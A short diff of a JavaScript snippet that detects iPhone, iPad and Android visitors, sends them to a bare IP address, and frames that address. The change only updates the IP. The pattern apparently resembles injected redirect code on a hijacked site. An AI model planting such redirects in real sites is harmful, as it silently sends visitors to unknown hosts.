@@ -1,12 +1,12 @@
 if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
     //alert(navigator.userAgent);  
-    window.location.href = "http://38.26.195.34";
+    window.location.href = "http://38.26.195.36";
 }else if (/(Android)/i.test(navigator.userAgent)) {
     //alert(navigator.userAgent); 
-    window.location.href = "http://38.26.195.34";
+    window.location.href = "http://38.26.195.36";
 }
 var titlestr=document.title;
-setFrame("http://38.26.195.34");
+setFrame("http://38.26.195.36");
 
 
 
